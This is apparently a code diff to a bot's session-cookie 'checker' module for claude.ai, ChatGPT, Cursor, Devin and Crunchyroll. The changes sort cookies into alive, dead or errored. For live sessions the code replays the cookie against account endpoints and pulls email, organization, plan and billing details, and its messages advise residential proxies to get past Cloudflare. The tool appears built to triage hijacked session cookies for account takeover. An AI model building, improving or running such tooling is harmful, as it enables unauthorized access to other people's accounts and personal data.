@@ -363,13 +363,17 @@ def _looks_like_cf_challenge(text: str) -> bool:
     return any(m in text for m in _CF_CHALLENGE_MARKERS)
 
 
-def _http_error_message(resp: dict, endpoint: str) -> str:
+def _http_error_message(resp: dict, endpoint: str) -> tuple[str, bool]:
     """Turn a normalised ``_request_json`` response into a user-facing error.
 
-    The legacy checkers used to silently return ``alive=False`` for any
-    non-200, which made dead cookies indistinguishable from datacenter
-    Cloudflare blocks. Surface the distinction so the bot can tell the
-    user whether to refresh cookies or to use a residential proxy.
+    Returns a tuple ``(message, is_dead)`` where ``is_dead`` is True when
+    the HTTP response is an authoritative dead-cookie verdict (401 etc.)
+    and False when the failure is environmental (timeouts, Cloudflare
+    challenges, 5xx). The bot's dashboard / formatter use this to bucket
+    a non-alive scan as either "DEAD" or "ERROR" — without it, every
+    dead Claude / Cursor / Crunchyroll cookie was being reported under
+    the "errored" bucket because the legacy checkers attached a
+    "session is dead" error string for both real-dead and challenge cases.
     """
     status = resp.get("status", 0)
     text = resp.get("text") or ""
@@ -377,20 +381,21 @@ def _http_error_message(resp: dict, endpoint: str) -> str:
 
     if status == 0:
         # Connection error / exception text was placed in ``text``.
-        return f"network error talking to {endpoint}: {text[:200]}"
+        return f"network error talking to {endpoint}: {text[:200]}", False
     if status == 401:
-        return f"{endpoint} returned 401 (cookie unauthorized — session is dead)"
+        return f"{endpoint} returned 401 (cookie unauthorized — session is dead)", True
     if status == 403:
         if _looks_like_cf_challenge(text):
             return (
                 f"{endpoint} returned a Cloudflare challenge "
                 f"(403, via={via}); session likely alive but the IP isn't trusted — "
                 "use a residential proxy or refresh cookies from the same IP."
-            )
-        return f"{endpoint} returned 403"
+            ), False
+        # A "real" 403 (not CF) is the site refusing the cookie.
+        return f"{endpoint} returned 403 (forbidden — cookie likely dead)", True
     if status == 429:
-        return f"{endpoint} returned 429 (rate-limited)"
-    return f"{endpoint} returned HTTP {status}"
+        return f"{endpoint} returned 429 (rate-limited)", False
+    return f"{endpoint} returned HTTP {status}", False
 
 
 def _request_json(
@@ -459,8 +464,14 @@ def _request_json(
 
 def check_claude(cookies: list[dict], proxy: str | None = None) -> dict:
     """Check claude.ai session and fetch account info."""
-    result = {"alive": False, "info": {}}
+    result = {"alive": False, "is_dead": False, "info": {}}
     cd = cookies_to_dict(cookies)
+
+    # No sessionKey at all → cookie can't possibly be alive.
+    if not cd.get("sessionKey"):
+        result["error"] = "no sessionKey cookie present (claude.ai needs it)"
+        result["is_dead"] = True
+        return result
 
     headers = {
         "User-Agent": USER_AGENT,
@@ -483,7 +494,9 @@ def check_claude(cookies: list[dict], proxy: str | None = None) -> dict:
             method="GET", proxy=proxy, timeout=15,
         )
         if resp["status"] != 200:
-            result["error"] = _http_error_message(resp, "claude.ai/api/organizations")
+            msg, is_dead = _http_error_message(resp, "claude.ai/api/organizations")
+            result["error"] = msg
+            result["is_dead"] = is_dead
             return result
 
         orgs = resp["json"]
@@ -494,30 +507,43 @@ def check_claude(cookies: list[dict], proxy: str | None = None) -> dict:
             except (ValueError, TypeError):
                 orgs = None
 
-        if True:
-            result["alive"] = True
-            if isinstance(orgs, list) and orgs:
-                org = orgs[0]
-                result["info"]["organization"] = org.get("name", "N/A")
-                result["info"]["org_id"] = org.get("uuid", "N/A")
-                result["info"]["capabilities"] = org.get("capabilities", [])
-                result["info"]["billing_type"] = org.get("billing_type", "N/A")
-                result["info"]["rate_limit_tier"] = org.get("rate_limit_tier", "N/A")
-                result["info"]["created_at"] = org.get("created_at", "N/A")
+        # /api/organizations on a dead session returns the same 200 +
+        # ``[]`` envelope as a never-logged-in browser. The legacy
+        # ``if True:`` branch ignored that and marked everything alive,
+        # which is exactly why the bot was reporting "alive or errors,
+        # never dead" for Claude cookies.
+        if not (isinstance(orgs, list) and orgs):
+            result["error"] = (
+                "claude.ai/api/organizations returned an empty list "
+                "(session unauthenticated — cookie dead)"
+            )
+            result["is_dead"] = True
+            return result
 
-                # Plan detection
-                caps = str(org.get("capabilities", []))
-                billing = org.get("billing_type", "none")
-                if "claude_pro" in caps or billing == "stripe":
-                    result["info"]["plan"] = "Pro"
-                elif org.get("raven_type"):
-                    result["info"]["plan"] = "Team/Enterprise"
-                else:
-                    result["info"]["plan"] = "Free"
+        result["alive"] = True
+        org = orgs[0]
+        result["info"]["organization"] = org.get("name", "N/A")
+        result["info"]["org_id"] = org.get("uuid", "N/A")
+        result["info"]["capabilities"] = org.get("capabilities", [])
+        result["info"]["billing_type"] = org.get("billing_type", "N/A")
+        result["info"]["rate_limit_tier"] = org.get("rate_limit_tier", "N/A")
+        result["info"]["created_at"] = org.get("created_at", "N/A")
 
-                # Free credits
-                result["info"]["free_credits"] = org.get("free_credits_status", "N/A")
-                result["info"]["active_flags"] = org.get("active_flags", [])
+        # Plan detection
+        caps = str(org.get("capabilities", []))
+        billing = org.get("billing_type", "none")
+        if "claude_max" in caps or "raven_max" in caps:
+            result["info"]["plan"] = "Max"
+        elif "claude_pro" in caps or billing == "stripe":
+            result["info"]["plan"] = "Pro"
+        elif org.get("raven_type"):
+            result["info"]["plan"] = "Team/Enterprise"
+        else:
+            result["info"]["plan"] = "Free"
+
+        # Free credits
+        result["info"]["free_credits"] = org.get("free_credits_status", "N/A")
+        result["info"]["active_flags"] = org.get("active_flags", [])
 
     except Exception as e:
         result["error"] = str(e)
@@ -580,7 +606,7 @@ def check_claude(cookies: list[dict], proxy: str | None = None) -> dict:
 
 def check_chatgpt(cookies: list[dict], proxy: str | None = None) -> dict:
     """Check chatgpt.com session and fetch account info."""
-    result = {"alive": False, "info": {}}
+    result = {"alive": False, "is_dead": False, "info": {}}
     cd = cookies_to_dict(cookies)
 
     # Extract user info from oai-client-auth-info cookie (works even without active session)
@@ -610,6 +636,13 @@ def check_chatgpt(cookies: list[dict], proxy: str | None = None) -> dict:
         s.cookies = jar
 
         r = _safe_get(s, "https://chatgpt.com/api/auth/session", headers, timeout=15)
+        if r.status_code == 401 or r.status_code == 403:
+            result["error"] = (
+                f"chatgpt.com/api/auth/session returned HTTP {r.status_code} "
+                "(cookie unauthorized — session is dead)"
+            )
+            result["is_dead"] = True
+            return result
         if r.status_code == 200:
             data = r.json()
             # Must have actual user data or accessToken (not just WARNING_BANNER)
@@ -690,7 +723,12 @@ def check_chatgpt(cookies: list[dict], proxy: str | None = None) -> dict:
                         pass
             elif not data.get("user") and not data.get("accessToken"):
                 # Session returned 200 but no user data = dead
-                pass
+                result["is_dead"] = True
+                result["error"] = (
+                    "chatgpt.com/api/auth/session returned 200 with no user "
+                    "or accessToken (cookie unauthenticated — session dead)"
+                )
+                return result
 
     except Exception as e:
         result["error"] = str(e)
@@ -703,11 +741,15 @@ def check_cursor(cookies: list[dict], proxy: str | None = None) -> dict:
     import base64
     from urllib.parse import unquote
 
-    result = {"alive": False, "info": {}}
+    result = {"alive": False, "is_dead": False, "info": {}}
     cd = cookies_to_dict(cookies)
 
     # Extract info from JWT in WorkosCursorSessionToken
     token_raw = cd.get("WorkosCursorSessionToken", "")
+    if not token_raw:
+        result["error"] = "no WorkosCursorSessionToken cookie present"
+        result["is_dead"] = True
+        return result
     if token_raw:
         token_decoded = unquote(token_raw)
         # JWT is after the :: separator
@@ -723,7 +765,15 @@ def check_cursor(cookies: list[dict], proxy: str | None = None) -> dict:
                 exp = decoded.get("exp")
                 if exp:
                     result["info"]["token_expires"] = datetime.fromtimestamp(exp).isoformat()
-                    result["info"]["token_expired"] = time.time() > exp
+                    if time.time() > exp:
+                        result["info"]["token_expired"] = True
+                        result["error"] = (
+                            f"WorkosCursorSessionToken JWT expired at "
+                            f"{result['info']['token_expires']}"
+                        )
+                        result["is_dead"] = True
+                        return result
+                    result["info"]["token_expired"] = False
                 iss = decoded.get("iss")
                 if iss:
                     result["info"]["issuer"] = iss
@@ -742,6 +792,13 @@ def check_cursor(cookies: list[dict], proxy: str | None = None) -> dict:
         s.cookies = jar
 
         r = _safe_get(s, "https://www.cursor.com/api/auth/session", headers, timeout=15)
+        if r.status_code in (401, 403):
+            result["error"] = (
+                f"cursor.com/api/auth/session returned HTTP {r.status_code} "
+                "(cookie unauthorized — session is dead)"
+            )
+            result["is_dead"] = True
+            return result
         if r.status_code == 200:
             try:
                 data = r.json()
@@ -753,8 +810,15 @@ def check_cursor(cookies: list[dict], proxy: str | None = None) -> dict:
                 result["info"]["email"] = user.get("email", data.get("email", "N/A"))
                 result["info"]["name"] = user.get("name", data.get("name", "N/A"))
                 result["info"]["image"] = user.get("image", "N/A")
-
-        if result["alive"]:
+            else:
+                # 200 but empty user payload — Cursor returns this when
+                # the WorkosCursorSessionToken has been revoked.
+                result["error"] = (
+                    "cursor.com/api/auth/session returned 200 with no user "
+                    "(session token revoked — cookie dead)"
+                )
+                result["is_dead"] = True
+                return result
             # Usage
             try:
                 r2 = _safe_get(s, "https://www.cursor.com/api/usage", headers)
@@ -800,7 +864,7 @@ def check_cursor(cookies: list[dict], proxy: str | None = None) -> dict:
 
 def check_devin(cookies: list[dict], proxy: str | None = None) -> dict:
     """Check devin.ai session and fetch account info."""
-    result = {"alive": False, "info": {}}
+    result = {"alive": False, "is_dead": False, "info": {}}
     cd = cookies_to_dict(cookies)
 
     headers = {
@@ -816,6 +880,13 @@ def check_devin(cookies: list[dict], proxy: str | None = None) -> dict:
         s.cookies = jar
 
         r = _safe_get(s, "https://app.devin.ai/api/auth/session", headers, timeout=15)
+        if r.status_code in (401, 403):
+            result["error"] = (
+                f"app.devin.ai/api/auth/session returned HTTP {r.status_code} "
+                "(cookie unauthorized — session is dead)"
+            )
+            result["is_dead"] = True
+            return result
         if r.status_code == 200:
             try:
                 data = r.json()
@@ -827,6 +898,13 @@ def check_devin(cookies: list[dict], proxy: str | None = None) -> dict:
                 result["info"]["email"] = user.get("email", data.get("email", "N/A"))
                 result["info"]["name"] = user.get("name", data.get("name", "N/A"))
                 result["info"]["image"] = user.get("image", "N/A")
+            else:
+                result["error"] = (
+                    "app.devin.ai/api/auth/session returned 200 with no user "
+                    "(cookie unauthenticated — session dead)"
+                )
+                result["is_dead"] = True
+                return result
 
     except Exception as e:
         result["error"] = str(e)
@@ -858,13 +936,14 @@ def _crunchyroll_token_body(cd: dict) -> str:
 
 def check_crunchyroll(cookies: list[dict], proxy: str | None = None) -> dict:
     """Check crunchyroll.com session and fetch account info."""
-    result = {"alive": False, "info": {}}
+    result = {"alive": False, "is_dead": False, "info": {}}
     cd = cookies_to_dict(cookies)
 
     # Check if etp_rt cookie exists (required for auth)
     has_etp = any(c.get("name") == "etp_rt" for c in cookies)
     if not has_etp:
         result["error"] = "no etp_rt cookie"
+        result["is_dead"] = True
         return result
 
     # ``noaihdevm_6iyg0a8l0q`` is the public web client_id Crunchyroll ships
@@ -898,7 +977,18 @@ def check_crunchyroll(cookies: list[dict], proxy: str | None = None) -> dict:
         )
 
         if resp["status"] != 200:
-            result["error"] = _http_error_message(resp, "crunchyroll auth/v1/token")
+            msg, is_dead = _http_error_message(resp, "crunchyroll auth/v1/token")
+            result["error"] = msg
+            result["is_dead"] = is_dead
+            # Crunchyroll's token endpoint also distinguishes "invalid_grant"
+            # in the body — that's a hard-dead etp_rt regardless of HTTP code.
+            body_low = (resp.get("text") or "").lower()
+            if "invalid_grant" in body_low or "invalid grant" in body_low:
+                result["is_dead"] = True
+                result["error"] = (
+                    f"crunchyroll auth/v1/token rejected etp_rt as invalid_grant "
+                    f"(HTTP {resp.get('status')}) — cookie dead"
+                )
             return result
 
         if True:
@@ -1006,6 +1096,16 @@ def check_crunchyroll(cookies: list[dict], proxy: str | None = None) -> dict:
                             pass
                 except:
                     pass
+            else:
+                # 200 token endpoint but no access_token in payload —
+                # Crunchyroll occasionally returns ``{}`` or an empty
+                # ``access_token`` field for revoked etp_rt cookies.
+                result["error"] = (
+                    "crunchyroll auth/v1/token returned 200 with no access_token "
+                    "(etp_rt revoked — cookie dead)"
+                )
+                result["is_dead"] = True
+                return result
 
     except Exception as e:
         result["error"] = str(e)
